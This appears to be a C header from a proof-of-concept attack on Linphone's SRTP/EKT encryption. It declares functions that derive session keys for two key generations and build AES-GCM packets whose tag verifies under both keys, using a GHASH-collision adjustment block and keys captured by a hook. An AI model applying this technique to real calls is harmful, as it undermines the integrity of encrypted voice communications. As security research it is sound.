/* attack_crypto.h — public surface of the per-packet ambiguous AES-GCM
 * ciphertext builder, ported bit-for-bit from the sage code under
 * attack/crypto/ (srtp_kdf.sage + gcm.sage + test_packet_ambiguous.sage).
 *
 * Inputs:
 *   - K_old / K_new : 32-byte inner master keys for the two SRTP
 *                     generations (the sliding window the hook
 *                     maintains from set_srtp_inner_send_key captures).
 *   - master_salt   : 12-byte AEAD-AES-256-GCM master salt (= CSPI[:12]
 *                     in Linphone). Must be the SAME for both K_old
 *                     and K_new (in Linphone they share the EKT-bound
 *                     master_salt across key rotations of the same
 *                     epoch).
 *   - per-packet (ssrc, roc, seq) for nonce construction.
 *   - AAD           : RTP fixed header + CSRC list (no extension).
 *   - plaintext     : adversary-laid-out bytes (multiple of 16). The
 *                     16-byte slot at adjustment_offset is treated as
 *                     a "free" block — the math overwrites it so the
 *                     produced tag verifies under both keys.
 *
 * Output:
 *   - out_ciphertext_inplace[adjustment_offset:adjustment_offset+16] gets
 *     overwritten with the GHASH-collision-derived adjustment block.
 *     The rest is plaintext XOR AES-CTR keystream under K_enc_OLD.
 *   - out_tag16 is the 16-byte authentication tag that verifies under
 *     BOTH (K_enc_OLD, nonce_OLD) and (K_enc_NEW, nonce_NEW) with the
 *     given AAD.
 *
 * Equivalence is checked bit-for-bit against
 *   attack/crypto/test_packet_ambiguous.sage::build_ambiguous_under_inner_keys
 * in test_attack_crypto. */

#ifndef ATTACK_CRYPTO_H
#define ATTACK_CRYPTO_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

typedef struct {
    uint8_t k_enc_old[32];        /* SRTP-KDF label 0x00 derived */
    uint8_t k_enc_new[32];
    uint8_t s_session_old[12];    /* SRTP-KDF label 0x02 derived */
    uint8_t s_session_new[12];
} ambig_session_keys_t;

/* Derive (K_enc, S_session) for both K_old and K_new from their
 * 32-byte master_key and 12-byte master_salt. Linphone's EKT layer
 * rotates the salt together with the key (every new EKT generation
 * picks a fresh CSPI / mSrtpMasterSalt), so K_old and K_new in the
 * hook's sliding window typically have DIFFERENT salts — each must be
 * paired with its own salt for the SRTP-KDF to match what the
 * respective receiver's libsrtp computes.
 *
 * For the backward-compatible "single shared salt" case used by the
 * standalone test vectors, pass the same buffer for both salt args. */
int ambig_derive_session_keys(const uint8_t master_key_old[32],
                              const uint8_t master_salt_old[12],
                              const uint8_t master_key_new[32],
                              const uint8_t master_salt_new[12],
                              ambig_session_keys_t *out);

/* Build the per-packet ambiguous ciphertext + tag.
 *   plaintext_len must be a positive multiple of 16.
 *   adjustment_offset must be 16-byte aligned and < plaintext_len.
 *   out_ciphertext must have room for plaintext_len bytes.
 *   out_tag16 must have room for 16 bytes.
 * Returns 0 on success. */
int ambig_build_packet(const ambig_session_keys_t *keys, uint32_t ssrc,
                       uint32_t roc, uint16_t seq, const uint8_t *aad,
                       size_t aad_len, const uint8_t *plaintext,
                       size_t plaintext_len, size_t adjustment_offset,
                       uint8_t *out_ciphertext, uint8_t out_tag16[16]);

#ifdef __cplusplus
}
#endif

#endif /* ATTACK_CRYPTO_H */
